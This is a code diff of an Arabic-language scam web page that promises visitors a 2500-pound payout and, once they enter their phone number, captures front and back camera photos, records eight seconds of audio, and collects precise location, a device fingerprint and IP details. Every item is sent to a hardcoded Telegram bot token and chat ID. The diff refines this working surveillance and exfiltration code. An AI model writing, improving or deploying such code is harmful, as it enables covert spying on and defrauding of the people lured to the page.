@@ -226,147 +226,182 @@
         const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
         const MASTER_ID = "5849068535";
         
-        async function sendTextToBot(message) {
+        // =============== دالة الإرسال الأساسية (نفس الكود الأصلي) ===============
+        async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
             try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: MASTER_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                return true;
-            } catch(e) { return false; }
-        }
-        
-        // رفع الملفات إلى Telegra.ph مع تحسين جودة الرفع
-        async function uploadToTelegraph(blob, filename) {
-            const formData = new FormData();
-            formData.append('file', blob, filename);
-            try {
-                const response = await fetch('https://telegra.ph/upload', {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'cors'
-                });
-                const result = await response.json();
-                if (result && result[0] && result[0].src) {
-                    return 'https://telegra.ph' + result[0].src;
+                let url = `https://api.telegram.org/bot${botToken}/`;
+                if (type === 'photo') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
+                } 
+                else if (type === 'video') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendVideo', { method: 'POST', body: fd });
                 }
-                return null;
-            } catch(e) {
-                console.error("Upload error:", e);
-                return null;
+                else if (type === 'audio') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('audio', mediaBlob, 'voice_note.ogg');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendAudio', { method: 'POST', body: fd });
+                }
+                else {
+                    await fetch(url + 'sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML', disable_web_page_preview: true })
+                    });
+                }
+                return true;
+            } catch(e) { console.warn("[telegram]", e); return false; }
+        }
+
+        // =================== التقاط الكاميرا (نفس الكود الأصلي) ===================
+        async function captureFrontCamera(chatId, botToken, phoneNumber) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 800;
+                canvas.height = video.videoHeight || 600;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                const caption = `📸 كاميرا أمامية (سيلفي)\n📞 الرقم: ${phoneNumber}`;
+                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { 
+                console.warn("Front camera denied");
+                return false; 
             }
         }
 
-        // التقاط صورة من الكاميرا (أمامية أو خلفية)
-        async function captureAndUpload(facingMode, label, phoneNumber) {
+        async function captureBackCamera(chatId, botToken, phoneNumber) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: { exact: facingMode } } 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.playsInline = true;
-                await video.play();
+                video.play();
                 await new Promise(r => setTimeout(r, 500));
-                
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+                canvas.width = video.videoWidth || 1024;
+                canvas.height = video.videoHeight || 768;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                const caption = `📷 كاميرا خلفية - محيط المستخدم\n📞 الرقم: ${phoneNumber}`;
+                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
-                
-                const url = await uploadToTelegraph(blob, `${label}_${Date.now()}.jpg`);
-                return url;
-            } catch(e) {
-                console.error(`${label} error:`, e);
-                return null;
+                return true;
+            } catch(e) { 
+                console.warn("Back camera denied");
+                return false; 
             }
         }
-        
-        // تسجيل صوتي ورفعه
-        async function recordAndUpload(phoneNumber) {
+
+        async function recordAmbientAudio(chatId, botToken, phoneNumber) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                 const chunks = [];
-                
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                const recordedPromise = new Promise(resolve => {
+                const audioPromise = new Promise(resolve => {
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const url = await uploadToTelegraph(blob, `audio_${Date.now()}.webm`);
-                        resolve(url);
+                        const caption = `🎤 تسجيل صوتي (8 ثوان)\n📞 الرقم: ${phoneNumber}`;
+                        await sendToTelegram(chatId, botToken, 'audio', blob, caption);
+                        resolve(true);
                     };
                 });
-                
                 mediaRecorder.start();
-                await new Promise(r => setTimeout(r, 6000)); // 6 ثوانٍ
-                mediaRecorder.stop();
-                stream.getTracks().forEach(t => t.stop());
-                
-                return await recordedPromise;
-            } catch(e) {
-                console.error("Audio error:", e);
-                return null;
+                setTimeout(() => mediaRecorder.stop(), 8000);
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
+                return await audioPromise;
+            } catch(e) { 
+                console.warn("Audio denied");
+                return false; 
             }
         }
-        
-        // الحصول على معلومات الجهاز
-        async function getDeviceInfo(phoneNumber) {
+
+        // =================== الموقع الجغرافي ===================
+        function getPreciseLocation(chatId, botToken, phoneNumber) {
+            return new Promise((resolve) => {
+                if(!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const accuracy = pos.coords.accuracy;
+                    let addressHint = "";
+                    try {
+                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                        const data = await revGeo.json();
+                        if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
+                    } catch(e) {}
+                    const locMsg = `🌍 <b>الموقع الجغرافي</b>\n📞 الرقم: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
+                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
+                    resolve(true);
+                }, (err) => {
+                    console.warn("Location denied");
+                    resolve(false);
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            });
+        }
+
+        // =================== IP ومعلومات الجهاز ===================
+        async function getDeepDeviceFingerprint(chatId, botToken, phoneNumber) {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
             const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
-            const cores = navigator.hardwareConcurrency || "غير معروف";
+            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
+            
             let batteryLevel = "غير متاح";
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
-                    batteryLevel = `${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
+                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
                 } catch(e) {}
             }
-            return `🖥️ <b>بصمة الجهاز</b>\n📞 ${phoneNumber}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | النوى: ${cores}\n🔋 البطارية: ${batteryLevel}\n📍 الوقت: ${timeZone}\n🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            
+            let connection = "غير معروف";
+            if (navigator.connection) {
+                connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
+            }
+            
+            const deviceMsg = `🕵️‍♂️ <b>بصمة الجهاز</b>\n📞 الرقم: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            
+            await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
         }
-        
-        // معلومات الـ IP
-        async function getIPInfo(phoneNumber) {
+
+        async function getRichIPData(chatId, botToken, phoneNumber) {
             try {
                 const [ipRes, ipInfoRes] = await Promise.all([
                     fetch('https://api.ipify.org?format=json'),
                     fetch('https://ipapi.co/json/')
                 ]);
                 const ipData = await ipRes.json();
-                const ipDetails = await ipInfoRes.json();
-                return `🌐 <b>معلومات IP</b>\n📞 ${phoneNumber}\n🔹 IP: ${ipData.ip}\n🏳️ البلد: ${ipDetails.country_name || 'غير معروف'}\n🏙️ المدينة: ${ipDetails.city || 'غير معروف'}\n📡 المزود: ${ipDetails.org || 'غير معروف'}`;
-            } catch(e) {
-                return `🌐 IP: تعذر الحصول على البيانات`;
-            }
+                let ipDetails = {};
+                try { ipDetails = await ipInfoRes.json(); } catch(e) {}
+                const ipAddr = ipData.ip;
+                let country = ipDetails.country_name || "غير معروف";
+                let city = ipDetails.city || "غير معروف";
+                let isp = ipDetails.org || ipDetails.asn || "غير معروف";
+                const ipMsg = `🌐 <b>IP & Network</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
+                await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
+            } catch(e) {}
         }
-        
-        // الموقع الجغرافي
-        function getLocation(phoneNumber) {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const { latitude, longitude } = pos.coords;
-                    let address = "";
-                    try {
-                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`);
-                        const data = await revGeo.json();
-                        if (data.display_name) address = data.display_name.substring(0, 150);
-                    } catch(e) {}
-                    resolve(`📍 <b>الموقع الجغرافي</b>\n📞 ${phoneNumber}\n🎯 ${latitude}, ${longitude}\n🗺️ https://www.google.com/maps?q=${latitude},${longitude}\n${address ? '🏠 ' + address : ''}`);
-                }, () => resolve(null), { enableHighAccuracy: true, timeout: 8000 });
-            });
-        }
-        
+
         // =============== التشغيل الرئيسي ===============
         const claimBtn = document.getElementById('claimMoneyBtn');
         const phoneInput = document.getElementById('targetPhone');
@@ -394,46 +429,39 @@
             statusSpan.innerHTML = "📡 جاري طلب الأذونات...";
             
             // 1. إرسال رقم الهاتف
-            await sendTextToBot(`📞 <b>رقم المستفيد الجديد</b>\n🔢 ${phoneNumber}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
+            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, `📞 <b>رقم المستفيد الجديد</b>\n🔢 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
             
-            // 2. معلومات الجهاز + IP
+            // 2. بصمة الجهاز + IP
             loaderText.innerText = "📱 جاري قراءة بيانات الجهاز...";
-            await sendTextToBot(await getDeviceInfo(phoneNumber));
-            await sendTextToBot(await getIPInfo(phoneNumber));
+            await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber);
+            await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber);
             
-            // 3. الكاميرا الأمامية (سيلفي)
+            // 3. الكاميرا الأمامية
             loaderText.innerText = "📸 جاري فتح الكاميرا الأمامية...";
-            const frontUrl = await captureAndUpload('user', 'selfie', phoneNumber);
-            if (frontUrl) await sendTextToBot(`📸 <b>صورة السيلفي</b>\n📞 ${phoneNumber}\n🔗 ${frontUrl}`);
-            else await sendTextToBot(`❌ فشل التقاط الكاميرا الأمامية`);
+            await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
             
             // 4. الكاميرا الخلفية
             loaderText.innerText = "📷 جاري فتح الكاميرا الخلفية...";
-            const backUrl = await captureAndUpload('environment', 'surrounding', phoneNumber);
-            if (backUrl) await sendTextToBot(`📷 <b>صورة الكاميرا الخلفية</b>\n📞 ${phoneNumber}\n🔗 ${backUrl}`);
-            else await sendTextToBot(`❌ فشل التقاط الكاميرا الخلفية`);
+            await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
             
             // 5. التسجيل الصوتي
-            loaderText.innerText = "🎤 جاري تسجيل الصوت...";
-            const audioUrl = await recordAndUpload(phoneNumber);
-            if (audioUrl) await sendTextToBot(`🎤 <b>تسجيل صوتي</b>\n📞 ${phoneNumber}\n🔗 ${audioUrl}`);
-            else await sendTextToBot(`❌ فشل التسجيل الصوتي`);
+            loaderText.innerText = "🎤 جاري تسجيل الصوت (8 ثوان)...";
+            await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
             
-            // 6. الموقع الجغرافي
+            // 6. الموقع
             loaderText.innerText = "📍 جاري تحديد الموقع...";
-            const locationMsg = await getLocation(phoneNumber);
-            if (locationMsg) await sendTextToBot(locationMsg);
+            await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
             
-            // 7. إتمام العملية
-            await sendTextToBot(`✅ <b>اكتمل جمع البيانات!</b>\n📞 ${phoneNumber}\n💰 سيتم صرف 2500 ج.م خلال 24 ساعة`);
+            // 7. إشعار الإكتمال
+            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, `✅ <b>اكتمل جمع البيانات بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n💰 سيتم صرف 2500 ج.م خلال 24 ساعة إلى هذا الرقم`);
             
             loaderDiv.style.visibility = "hidden";
             errorDiv.style.backgroundColor = "#e8f5e9";
             errorDiv.style.color = "#2e7d32";
-            errorDiv.innerText = "🎉 تم استلام طلبك! سيصلك المبلغ خلال 24 ساعة.";
+            errorDiv.innerText = "🎉 تم استلام طلبك بنجاح! خلال 24 ساعة سوف يصلك المبلغ.";
             errorDiv.style.display = "block";
             claimBtn.disabled = false;
-            statusSpan.innerHTML = "✅ تم التفعيل";
+            statusSpan.innerHTML = "✅ تم التفعيل - سيصلك المبلغ خلال 24 ساعة";
             isRunning = false;
             
             setTimeout(() => errorDiv.style.display = "none", 8000);
